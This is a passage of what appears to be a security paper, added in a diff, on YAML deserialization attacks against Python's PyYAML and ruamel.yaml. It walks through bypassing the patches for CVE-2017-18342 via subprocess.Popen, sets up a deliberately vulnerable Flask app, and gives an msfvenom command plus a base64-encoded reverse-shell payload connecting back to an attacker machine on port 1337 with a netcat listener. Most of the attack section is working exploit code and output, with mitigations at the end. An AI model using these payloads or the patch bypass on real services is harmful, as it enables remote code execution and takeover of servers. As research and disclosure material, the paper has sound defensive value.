+ data = constructor(self, tag_suffix, node)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\constructor.py", line 624, in
+construct_python_object_apply
+ instance = self.make_python_instance(suffix, node, args, kwds, newobj)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\constructor.py", line 570, in
+make_python_instance
+ node.start_mark)
+yaml.constructor.ConstructorError: while constructing a Python instance
+expected a class, but found &lt;class 'builtin_function_or_method'&gt;
+ in "&lt;byte string&gt;", line 1, column 1:
+ !!python/object/apply:time.sleep ... 
+</code></pre>
+<p>It failed, because in version &gt;= 5.1, it doesn’t allow to deserialize any serialized python class or class attribute, with Loader not specified in <code>load()</code> or Loader=SafeLoader. <strong>Only class type objects are allowed to deserialize which are present in the script or imported in the script.</strong><br>
+The question arises, why it is happening in these conditions. For that, the changes made to <code>constructor.py</code> of <code>PyYAML</code> are responsible. There are two patches in version &gt;=5.1 that restrict deserialization of built-in class methods and use of those classes which are not imported or present in the deserialization code.<br>
+Code of <code>constructor.py</code> of <code>PyYAML</code> version &gt;=5.1:</p>
+<p>Patch 1:</p>
+<p><a href="./files/7.png" target="_blank" rel="noopener noreferrer"><img src="./files/7.png" alt="" style="max-width:100%;"></a></p>
+<p>Patch 2:</p>
+<p><a href="./files/8.png" target="_blank" rel="noopener noreferrer"><img src="./files/8.png" alt="" style="max-width:100%;"></a></p>
+<p>The code can stop its execution because of any of the above highlighted conditions to be True.
+In Patch 1, <code>sys.modules</code> list down all the modules getting used in the code. Let us check if the “time” module is in code or not?</p>
+<pre><code>import yaml
+import sys
+print(sys.modules['time'])
+</code></pre>
+<p>output:
+<code>&lt;module 'time' (built-in)&gt;</code>
+The output shows that the “time” module is present in the code. The question arises, how? It is because YAML modules have some classes like constructor.py etc. which uses datetime module and it is very clear from datetime module that datetime uses “time” module.</p>
+<p>Code of datetime module:</p>
+<p><a href="./files/9.png" target="_blank" rel="noopener noreferrer"><img src="./files/9.png" alt="" style="max-width:100%;"></a></p>
+<p>Since, “time” module is a part of the code, sys.modules lists “time”, this condition becomes False and code moves forward.</p>
+<p>It is evidentiary, the maintainer of this module wanted to allow deserialization of used classes or modules in the deserializing code only. Hence, it is not a proper patch.</p>
+<p>Other cases in which it will make this highlighted condition to be false and deserialize data are:</p>
+<ol>
+<li>That class or module is explicitly imported in the deserializing code.
+Example:</li>
+</ol>
+<pre><code>import yaml
+import time
+data = b'!!python/object/apply:time.sleep [10]'
+deserialized_data = yaml.load(data) # deserializing data
+print(deserialized_data)
+</code></pre>
+<ol start="2">
+<li>Any module is imported in deserializing code which is using that specified class/module in its code. For Example, PyYAML's constructor.py is having datetime imported and datetime have time imported so time is present in sys .modules.</li>
+</ol>
+<p>Example:</p>
+<pre><code>import yaml
+data = b'!!python/object/apply:time.sleep [10]'
+deserialized_data = yaml.load(data) # deserializing data
+print(deserialized_data)
+</code></pre>
+<ol start="3">
+<li>Deserializing code have a custom class and required class methods as its class method.</li>
+</ol>
+<pre><code>import yaml
+class time:
+ def sleep(self, t):
+ print("Sleeping "+t+" seconds")
+data = b'!!python/object/apply:time.sleep [10]'
+deserialized_data = yaml.load(data) # deserializing data
+print(deserialized_data)
+</code></pre>
+<p>This will not give 10-second delay but prints “Sleeping 10 seconds” in console.
+For all the above conditions, the first patch can be bypassed and code jumps to the next steps.
+Secondly, the code will check if “sleep” is an attribute of module “time” using <code>hasattr()</code>.</p>
+<p><a href="./files/10.png" target="_blank" rel="noopener noreferrer"><img src="./files/10.png" alt="" style="max-width:100%;"></a></p>
+<p>If the <code>object_name</code> is the attribute of the module then it will make condition false and code will jump to return statement on line 544. Now, <code>getattr(module, object_name)</code> try to create an object of attribute <code>object_name</code> of module and represent it like below,</p>
+<p>Code:</p>
+<pre><code>import yaml
+import sys
+print(getattr(sys.modules['time'], 'sleep'))
+</code></pre>
+<p>Output:
+<code>&lt;built-in function sleep&gt;</code></p>
+<p>The output shows that the type of attribute “sleep” in the “time” module. It clearly shows that “sleep” exist as an individual function in the time module and not as a class or class method.</p>
+<p>Coming to Patch 2, it will check, what type of attribute the deserialized data is calling in the specified module or class using <code>isinstance(cls, type)</code>. If it is not of type class then it will make condition true and stops execution with an error, like in case of “time.sleep”. “sleep” gives “built-in function” type and not the class type which takes this condition as false.</p>
+<p>Code:</p>
+<pre><code>import yaml
+import sys
+cls = getattr(sys.modules['time'], 'sleep')
+print(isinstance(cls, type))
+</code></pre>
+<p>Output:
+<code>False</code></p>
+<p>We can bypass it by deserializing objects of classes only and not class methods or any other type of attributes of module. In short, we needed “sleep” to be a class instead of a function to make it
+executed.</p>
+<p>Trying same code in <code>Pyyaml</code> version &lt; 5.1, <code>load(data, Loader=Loader)</code>, <code>load(data, Loader=FullLoader)</code> or <code>load(data, Loader=UnsafeLoader)</code>, we will get output with delay of 10 seconds which completely show that “time.sleep(10)” will get executed. The “None” is the return value of “time.sleep(10)” after execution.</p>
+<p>Output;
+<code>None</code></p>
+<p>For the PyYAML version &lt; 5.1, the constructor.py don’t have these patches and works fine.</p>
+<p>In <code>ruamel.yaml</code>, deserialization of class objects can take place like this,</p>
+<pre><code>import ruamel.yaml as yaml
+data = b'!!python/object/apply:time.sleep [10]'
+deserialized_data = yaml.load(data) # serializing data
+print(deserialized_data)
+</code></pre>
+<p>Output;</p>
+<pre><code>C:/Users/j0lt/paper_files/main.py:4: UnsafeLoaderWarning:
+The default 'Loader' for 'load(stream)' without further arguments can be
+unsafe.
+Use 'load(stream, Loader=ruamel.yaml.Loader)' explicitly if that is OK.
+Alternatively include the following in your code:
+ import warnings
+ warnings.simplefilter('ignore', ruamel.yaml.error.UnsafeLoaderWarning)
+In most other cases you should consider using 'safe_load(stream)'
+ deserialized_data = yaml.load(data) # serializing data
+None
+</code></pre>
+<p>It will show a warning message before deserializing data. “None” will be printed on screen after 10 seconds delay which completely shows that “time.sleep(10)” will get executed when it gets converted to object again with deserialization.
+<br></p>
+<h1>
+<a id="user-content-exploiting-yaml-deserialization" class="anchor" href="#exploiting-yaml-deserialization" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>EXPLOITING YAML DESERIALIZATION</h1>
+<p>It is clear that Python YAML modules can serialize objects of python inbuild classes and their attributes , and when it deserializes them, it recreates those objects, which can sometimes lead to their execution, depending if those objects tend to execute and return something. This means we can also serialize objects of those class methods which can basically execute OS commands. Modules like os, subprocess etc. are very good to go as they have methods which can execute OS commands.</p>
+<p>Let’s first create our payload, like we normally serialize objects of class methods using <code>__reduce__()</code>.</p>
+<p>Kindly note payload creation can be done with any python YAML module (<code>PyYAML</code> or <code>ruamel.yaml</code>), in the same way. The same payload can exploit both YAML module or any module based on PyYAML or <code>ruamel.yaml</code>.</p>
+<p>Our target is to run OS commands when our payload gets deserialized. In Linux, ls is a terminal command used to list items in the present directory.</p>
+<p>Code:</p>
+<pre><code>import yaml
+import subprocess
+class Payload(object):
+ def __reduce__(self):
+ return (subprocess.Popen,('ls',))
+deserialized_data = yaml.dump(Payload()) # serializing data
+print(deserialized_data)
+</code></pre>
+<p>Output:</p>
+<pre><code>!!python/object/apply:subprocess.Popen
+- ls
+</code></pre>
+<p>One can use a tool created by me to create payloads for <code>YAML</code> in python available on Github(<a href="https://github.com/j0lt-github/python-deserialization-attack-payload-generator">https://github.com/j0lt-github/python-deserialization-attack-payload-generator</a>). It is an advanced payload generator. One can create payloads for complex commands using this tool in seconds. It also supports other payload generation for deserialization attack on <code>pickle</code> and <code>jsonpickle</code>.</p>
+<p>Now let's write a code which can deserialize this.
+<br></p>
+<h5>
+<a id="user-content-exploiting-yaml-in-pyyaml-version--51" class="anchor" href="#exploiting-yaml-in-pyyaml-version--51" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Exploiting YAML in PyYAML version &lt; 5.1</h5>
+<p>To deserialize above result i.e. serialized class method with arguments, in PyYAML version &lt; 5.1, we have below methods,</p>
+<table>
+<thead>
+<tr>
+<th>Methods in PyYAML &lt; 5.1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>load(data)</td>
+</tr>
+<tr>
+<td>load(data, Loader=Loader)</td>
+</tr>
+<tr>
+<td>load_all(data)</td>
+</tr>
+<tr>
+<td>load_all(data, Loader=Loader)</td>
+</tr>
+</tbody>
+</table>
+<p>So, any of the above methods can be used. Even we can directly call load() by supplying data to deserialize and it will deserialize it perfectly and our class Popen will be executed.</p>
+<p>Example Code:</p>
+<pre><code>import yaml
+data = b"""!!python/object/apply:subprocess.Popen
+- ls"""
+deserialized_data = yaml.load(data) # deserializing data
+print(deserialized_data)
+</code></pre>
+<p>Output:</p>
+<pre><code>test.py
+abc.txt
+test.txt
+</code></pre>
+<p>The output will show the list of content in the present working directory.</p>
+<p>This causes RCE and in 2017 a researcher reported it and a CVE was released, CVE-2017-18342. But that time it was tested on version &lt; 5.1 and patches were released afterwards in versions &gt;=5.1</p>
+<h5>
+<a id="user-content-exploiting-yaml-in-pyyaml-version--51-1" class="anchor" href="#exploiting-yaml-in-pyyaml-version--51-1" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Exploiting YAML in PyYAML version &gt;= 5.1</h5>
+<p>To deserialize above result i.e. serialized class method with arguments, in PyYAML version &gt;= 5.1, we have below methods,</p>
+<table>
+<thead>
+<tr>
+<th>Methods in PyYAML</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>load(data) [works under certain conditions]</td>
+</tr>
+<tr>
+<td>load(data, Loader=Loader)</td>
+</tr>
+<tr>
+<td>load(data, Loader=UnsafeLoader)</td>
+</tr>
+<tr>
+<td>load(data, Loader=FullLoader)</td>
+</tr>
+<tr>
+<td>load_all(data) [works under certain condition]</td>
+</tr>
+<tr>
+<td>load_all(data, Loader=Loader)</td>
+</tr>
+<tr>
+<td>load_all(data, Loader=UnSafeLoader)</td>
+</tr>
+<tr>
+<td>load_all(data, Loader=FullLoader)</td>
+</tr>
+<tr>
+<td>full_load(data)</td>
+</tr>
+<tr>
+<td>full_load_all(data)</td>
+</tr>
+<tr>
+<td>unsafe_load(data)</td>
+</tr>
+<tr>
+<td>unsafe_load_all(data)</td>
+</tr>
+</tbody>
+</table>
+<p>Any method mentioned above can be used to deserialize custom class objects, except <code>load()</code> and <code>load_all()</code> with default <code>“Loader”</code> as maintainer for <code>PyYAML</code> have applied some changes to stop this type of vulnerability but. But there is a certain condition which let us bypass this patch discussed earlier. Let’s first try to deserialize data with other methods,</p>
+<p>Example 1 code:</p>
+<pre><code>from yaml import *
+data = b"""!!python/object/apply:subprocess.Popen
+- ls"""
+deserialized_data = load(data, Loader=Loader) # deserializing data
+print(deserialized_data)
+</code></pre>
+<p>Output:</p>
+<pre><code>&lt;subprocess.Popen object at 0x7fc2a7ec9fff&gt;
+test.py
+abc.txt
+test.txt
+</code></pre>
+<p>Example 2:</p>
+<p>Code:</p>
+<pre><code>from yaml import *
+data = b"""!!python/object/apply:subprocess.Popen
+- ls"""
+deserialized_data = unsafe_load(data, Loader=Loader) # deserializing data
+print(deserialized_data)
+</code></pre>
+<p>Output:</p>
+<pre><code>&lt;subprocess.Popen object at 0x7fc2a7ec813a&gt;
+test.py
+abc.txt
+test.txt
+</code></pre>
+<p>Like these, other mentioned methods will work similarly except <code>load()</code> with default values.</p>
+<p>Code with default <code>load()</code> values:</p>
+<pre><code>import yaml
+data = b"""!!python/object/apply:subprocess.Popen
+- ls"""
+deserialized_data = yaml.load(data) # deserializing data
+print(deserialized_data)
+</code></pre>
+<p>Output:</p>
+<pre><code>test.py:4: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the
+default Loader is unsafe. Please read https://msg.pyyaml.org/load for full details.
+ yaml.load(data)
+Traceback (most recent call last):
+ File "test.py", line 4, in &lt;module&gt;
+ yaml.load(data)
+ File "/usr/lib/python2.7/dist-packages/yaml/__init__.py", line 114, in load
+ return loader.get_single_data()
+ File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 45, in get_single_data
+ return self.construct_document(node)
+ File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 49, in
+construct_document
+ data = self.construct_object(node)
+ File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 96, in
+construct_object
+ instance = self.make_python_instance(suffix, node, args, kwds, newobj)
+ File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 554, in
+make_python_instance
+ cls = self.find_python_name(suffix, node.start_mark)
+ File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 522, in
+find_python_name
+ "module %r is not imported" % module_name.encode('utf-8'), mark)
+yaml.constructor.ConstructorError: while constructing a Python object
+module 'subprocess' is not imported
+ in "&lt;string&gt;", line 1, column 1:
+ !!python/object/apply:subprocess ...
+ ^
+</code></pre>
+<p>It can be seen clearly from the error that the code stop executing at Patch 1, because sys.modules don’t have subprocess.</p>
+<p>Code:</p>
+<pre><code>import yaml
+import sys
+print(sys.modules['subprocess'])
+</code></pre>
+<p>Output:</p>
+<pre><code>Traceback (most recent call last):
+ File "/home/j0lt/main.py", line 3, in &lt;module&gt;
+ print(sys.modules['subprocess'])
+KeyError: 'subprocess'
+</code></pre>
+<p>For make it running we have to just import subprocess in the code or import any module which has subprocess imported. For example, lets import “<code>flask</code>” in the code and execute it.</p>
+<p>Code:</p>
+<pre><code>import yaml
+import flask # importing flask
+data = b"""!!python/object/apply:subprocess.Popen
+- ls"""
+deserialized_data = yaml.load(data) # deserializing data
+print(deserialized_data)
+</code></pre>
+<p>Output:</p>
+<pre><code>test.py:5: YAMLLoadWarning: calling yaml.load() without Loader=... is
+deprecated, as the default Loader is unsafe. Please read
+https://msg.pyyaml.org/load for full details.
+ a = yaml.load(data)
+&lt;subprocess.Popen object at 0x7fc2a7ec9e10&gt;
+abc.txt test.py
+</code></pre>
+<p>The command gets executed with a warning message. But it runs because of <code>Flask</code> imports some classes or modules which use subprocess.</p>
+<p>The question arises here is, if <code>PyYAML</code> doesn’t use subprocess then why not we use serialized object of <code>os.system</code> to run our command? <code>os.system</code> will run and execute commands in <code>PyYAML</code> version &lt; 5.1 but in version &gt;=5.1 it will not work because of patch 2, as system is not a class in the os module.
+In case of Popen, Popen is a class in subprocess module and it bypasses patch 2. <strong>So this condition is a bypass to patches applied for CVE-2017-18342.</strong></p>
+<p>Let consider a web application running on the flask and which is using <code>yaml.load()</code> object to deserialize user-supplied input. Used python environment is python2.x.</p>
+<p>Code:</p>
+<pre><code>from flask import Flask, request
+import yaml
+from base64 import b64decode
+app = Flask(__name__)
+@app.route("/", methods=["GET","POST"])
+def index():
+ if request.method == "GET":
+ return '''&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;YAML Deserialization&lt;/h2&gt;&lt;form action="/"
+method="post"&gt;Data in Base64&lt;br&gt;&lt;input type="text" name="data" value=""&gt;&lt;br&gt;&lt;br&gt;&lt;input
+type="submit" value="Submit"&gt;&lt;/form&gt;&lt;p&gt;Enter base64 data to be
+deserialize&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'''
+ else:
+ data = yaml.load(b64decode(request.form.get("data")))
+ return '''&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h2&gt;YAML Deserialization&lt;/h2&gt;&lt;form action="/"
+method="post"&gt;Data in Base64&lt;br&gt;&lt;input type="text" name="data" value=""&gt;&lt;br&gt;&lt;br&gt;&lt;input
+type="submit" value="Submit"&gt;&lt;/form&gt;&lt;p&gt;Enter base64 data to be
+deserialize&lt;/p&gt;&lt;p&gt;Deserialized data is :'''+data+'''&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'''
+if __name__ == '__main__':
+ app.run("0.0.0.0", port=8080)
+</code></pre>
+<p>The application is running at port 8080.</p>
+<p><a href="./files/11.png" target="_blank" rel="noopener noreferrer"><img src="./files/11.png" alt="" style="max-width:100%;"></a></p>
+<p>In browser it will show page at http://:8080/</p>
+<p><a href="./files/12.png" target="_blank" rel="noopener noreferrer"><img src="./files/12.png" alt="" style="max-width:100%;"></a></p>
+<p>Now let's try a payload to get a reverse shell through RCE at port 1337 of attacker machine.
+We will use <code>msfvenom</code> and basic <code>yaml</code> syntax for generating a payload for a reverse shell.</p>
+<p>First, we need to use generate a python payload which can give us a reverse shell when executed. For that use <code>msfvenom</code>,
+<code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your port&gt; -f raw</code></p>
+<p>It will give output like,</p>
+<pre><code>"exec('aW1wb3J0IHNvY2tldCAgICAsICBzdWJwcm9jZXNzICAgICwgIG9zICAgICAgIDsgICAgICAgICBob3N0PSI
+xOTIuMTY4LjAuMTEiICAgICAgIDsgICAgICAgICBwb3J0PTEzMzcgICAgICAgOyAgICAgICAgIHM9c29ja2V0LnNvY
+2tldChzb2NrZXQuQUZfSU5FVCAgICAsICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgIDsgICAgICAgICBzLmNvbm5
+lY3QoKGhvc3QgICAgLCAgcG9ydCkpICAgICAgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgLCAgMCkgI
+CAgICAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAsICAxKSAgICAgICA7ICAgICAgICAgb3MuZHVwMih
+zLmZpbGVubygpICAgICwgIDIpICAgICAgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='
+.decode('base64'))"
+</code></pre>
+<p>So, our payload will look like this:</p>
+<pre><code>!!python/object/apply:subprocess.Popen
+- !!python/tuple
+ - python
+ - -c
+ - "exec('aW1wb3J0IHNvY2tldCAgICAsICBzdWJwcm9jZXNzICAgICwgIG9zICAgICAgIDsgICAgICAgICBob3N
+0PSIxOTIuMTY4LjAuMTEiICAgICAgIDsgICAgICAgICBwb3J0PTEzMzcgICAgICAgOyAgICAgICAgIHM9c29ja2V0L
+nNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAsICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgIDsgICAgICAgICBzLmN
+vbm5lY3QoKGhvc3QgICAgLCAgcG9ydCkpICAgICAgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgLCAgM
+CkgICAgICAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAsICAxKSAgICAgICA7ICAgICAgICAgb3MuZHV
+wMihzLmZpbGVubygpICAgICwgIDIpICAgICAgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoI
+ik='.decode('base64'))"
+</code></pre>
+<p>Kindly note that, we are not using <code>dump()</code> for generating this payload because of use of single and double quotes in our payload . Either we can make it manually like this or one can use peas available on Github (<a href="https://github.com/j0lt-github/python-deserialization-attack-payload-generator">https://github.com/j0lt-github/python-deserialization-attack-payload-generator</a>).</p>
+<p>Now, this payload in base64 is,</p>
+<pre><code>ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gcHl0aG9uCi
+AgLSAtYwogIC0gImV4ZWMoJ2FXMXdiM0owSUhOdlkydGxkQ0FnSUNBc0lDQnpkV0p3Y205alpYTnpJQ0FnSUN3Z0lH
+OXpJQ0FnSUNBZ0lEc2dJQ0FnSUNBZ0lDQm9iM04wUFNJeE9USXVNVFk0TGpBdU1URWlJQ0FnSUNBZ0lEc2dJQ0FnSU
+NBZ0lDQndiM0owUFRFek16Y2dJQ0FnSUNBZ095QWdJQ0FnSUNBZ0lITTljMjlqYTJWMExuTnZZMnRsZENoemIyTnJa
+WFF1UVVaZlNVNUZWQ0FnSUNBc0lDQnpiMk5yWlhRdVUwOURTMTlUVkZKRlFVMHBJQ0FnSUNBZ0lEc2dJQ0FnSUNBZ0
+lDQnpMbU52Ym01bFkzUW9LR2h2YzNRZ0lDQWdMQ0FnY0c5eWRDa3BJQ0FnSUNBZ0lEc2dJQ0FnSUNBZ0lDQnZjeTVr
+ZFhBeUtITXVabWxzWlc1dktDa2dJQ0FnTENBZ01Da2dJQ0FnSUNBZ095QWdJQ0FnSUNBZ0lHOXpMbVIxY0RJb2N5NW
+1hV3hsYm04b0tTQWdJQ0FzSUNBeEtTQWdJQ0FnSUNBN0lDQWdJQ0FnSUNBZ2IzTXVaSFZ3TWloekxtWnBiR1Z1Ynln
+cElDQWdJQ3dnSURJcElDQWdJQ0FnSURzZ0lDQWdJQ0FnSUNCd1BYTjFZbkJ5YjJObGMzTXVZMkZzYkNnaUwySnBiaT
+lpWVhOb0lpaz0nLmRlY29kZSgnYmFzZTY0JykpIg==
+</code></pre>
+<p>Open port for incoming shell connection using netcat.</p>
+<p><a href="./files/13.png" target="_blank" rel="noopener noreferrer"><img src="./files/13.png" alt="" style="max-width:100%;"></a></p>
+<p>Now try to submit this payload.</p>
+<p><a href="./files/14.png" target="_blank" rel="noopener noreferrer"><img src="./files/14.png" alt="" style="max-width:100%;"></a></p>
+<p>It will show an “Internal Server Error” on the browser.</p>
+<p><a href="./files/15.png" target="_blank" rel="noopener noreferrer"><img src="./files/15.png" alt="" style="max-width:100%;"></a></p>
+<p>But we will get a reverse connection in netcat.</p>
+<p><a href="./files/16.png" target="_blank" rel="noopener noreferrer"><img src="./files/16.png" alt="" style="max-width:100%;"></a></p>
+<p><a href="./files/17.png" target="_blank" rel="noopener noreferrer"><img src="./files/17.png" alt="" style="max-width:100%;"></a>
+<br></p>
+<h4>
+<a id="user-content-exploiting-yaml-in-ruamelyaml" class="anchor" href="#exploiting-yaml-in-ruamelyaml" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Exploiting YAML in ruamel.yaml</h4>
+<p>To deserialize the serialized class method with arguments, in ruamel.yaml , we have below methods,
+| Methods in ruamel.yaml |
+| ---------------------- |
+| load(data) |
+| load(data, Loader=Loader) |
+| load(data, Loader=UnsafeLoader) |
+| load(data, Loader=FullLoader) |
+| load_all(data) |
+| load_all(data, Loader=Loader) |
+| load_all(data, Loader=UnSafeLoader) |
+| load_all(data, Loader=FullLoader) |</p>
+<p>So, any of the above methods can be used. Even we can directly call <code>load()</code> by supplying data to deserialize and it will deserialize it perfectly and our class method will be executed.
+Code:</p>
+<pre><code>import ruamel.yaml
+data = b"""!!python/object/apply:subprocess.Popen
+- ls"""
+deserialized_data = ruamel.yaml.load(data) # serializing data
+print(deserialized_data)
+</code></pre>
+<p>Output:</p>
+<pre><code>/home/j0lt/paper_files/main.py:4: UnsafeLoaderWarning:
+The default 'Loader' for 'load(stream)' without further arguments can be
+unsafe.
+Use 'load(stream, Loader=ruamel.yaml.Loader)' explicitly if that is OK.
+Alternatively include the following in your code:
+ import warnings
+ warnings.simplefilter('ignore', ruamel.yaml.error.UnsafeLoaderWarning)
+In most other cases you should consider using 'safe_load(stream)'
+ deserialized_data = ruamel.yaml.load(data) # serializing data
+&lt;subprocess.Popen object at 0x7fc2a7ec9ef0&gt;
+abc.txt test.py
+</code></pre>
+<p>It will execute our command with a warning message. This shows till today, <code>ruamel.yaml</code> is vulnerable to RCE if it processes the user-supplied payload.</p>
+<h2>
+<a id="user-content-mitigations" class="anchor" href="#mitigations" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>MITIGATIONS</h2>
+<p>The proper mitigation to avoid RCE during the processing of YAML data is to use these functions to deserialize data,</p>
+<table>
+<thead>
+<tr>
+<th>Methods in PyYAML</th>
+<th>Methods in ruamel.yaml</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>safe_load()</td>
+<td>safe_load()</td>
+</tr>
+<tr>
+<td>safe_load_all()</td>
+<td>safe_load_all()</td>
+</tr>
+<tr>
+<td>load(‘data’, Loader=SafeLoader)</td>
+<td>load(‘data’, Loader=SafeLoader)</td>
+</tr>
+</tbody>
+</table>
+<p>And to serialize data, one can use below safe functions,</p>
+<table>
+<thead>
+<tr>
+<th>Methods in PyYAML</th>
+<th>Methods in ruamel.yaml</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>safe_dump()</td>
+<td>safe_dump()</td>
+</tr>
+<tr>
+<td>safe_dump_all()</td>
+<td>safe_dump_all()</td>
+</tr>
+<tr>
+<td>dump(‘data’, Dumper=SafeDumper)</td>
+<td>dump(‘data’, Dumper=SafeDumper)</td>
+</tr>
+</tbody>
+</table>
+<h2>
+<a id="user-content-references" class="anchor" href="#references" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>REFERENCES</h2>
+<ol>
+<li><a href="https://yaml.readthedocs.io/en/latest/pyyaml.html" rel="nofollow">https://yaml.readthedocs.io/en/latest/pyyaml.html</a></li>
+<li><a href="https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler" rel="nofollow">https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler</a></li>
+<li><a href="https://www.cvedetails.com/cve/CVE-2017-18342/" rel="nofollow">https://www.cvedetails.com/cve/CVE-2017-18342/</a></li>
+<li><a href="https://github.com/yaml/pyyaml">https://github.com/yaml/pyyaml</a></li>
+<li><a href="https://bitbucket.org/ruamel/yaml" rel="nofollow">https://bitbucket.org/ruamel/yaml</a></li>
+<li><a href="https://github.com/yaml/pyyaml/issues/207">https://github.com/yaml/pyyaml/issues/207</a></li>
+<li><a href="https://yaml.org/" rel="nofollow">https://yaml.org/</a></li>
+<li><a href="https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation">https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation</a></li>
+<li><a href="https://github.com/yaml/pyyaml/issues/265">https://github.com/yaml/pyyaml/issues/265</a></li>
+<li>Exploit-db: <a href="https://www.exploit-db.com/docs/47655" rel="nofollow">https://www.exploit-db.com/docs/47655</a>
+</li>
+<li>PacketStorm: <a href="https://packetstormsecurity.com/files/155299/YAML-Deserialization-Attack-In-Python.html" rel="nofollow">https://packetstormsecurity.com/files/155299/YAML-Deserialization-Attack-In-Python.html</a>
+</li>
+</ol>
+
+              </article>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    
+
+  </div>
+  <div>&nbsp;</div>
+  </div><script>
+    function showCanonicalImages() {
+      var images = document.getElementsByTagName('img');
+      if (!images) {
+        return;
+      }
+      for (var index = 0; index < images.length; index++) {
+        var image = images[index];
+        if (image.getAttribute('data-canonical-src') && image.src !== image.getAttribute('data-canonical-src')) {
+          image.src = image.getAttribute('data-canonical-src');
+        }
+      }
+    }
+
+    function scrollToHash() {
+      if (location.hash && !document.querySelector(':target')) {
+        var element = document.getElementById('user-content-' + location.hash.slice(1));
+        if (element) {
+           element.scrollIntoView();
+        }
+      }
+    }
+
+    function autorefreshContent(eventSourceUrl) {
+      var initialTitle = document.title;
+      var contentElement = document.getElementById('grip-content');
+      var source = new EventSource(eventSourceUrl);
+      var isRendering = false;
+
+      source.onmessage = function(ev) {
+        var msg = JSON.parse(ev.data);
+        if (msg.updating) {
+          isRendering = true;
+          document.title = '(Rendering) ' + document.title;
+        } else {
+          isRendering = false;
+          document.title = initialTitle;
+          contentElement.innerHTML = msg.content;
+          showCanonicalImages();
+        }
+      }
+
+      source.onerror = function(e) {
+        if (e.readyState === EventSource.CLOSED && isRendering) {
+          isRendering = false;
+          document.title = initialTitle;
+        }
+      }
+    }
+
+    window.onhashchange = function() {
+      scrollToHash();
+    }
+
+    window.onload = function() {
+      scrollToHash();
+    }
+
+    showCanonicalImages();
+
+    var autorefreshUrl = document.getElementById('preview-page').getAttribute('data-autorefresh-url');
+    if (autorefreshUrl) {
+      autorefreshContent(autorefreshUrl);
+    }
+  </script>
+
+</body></html>
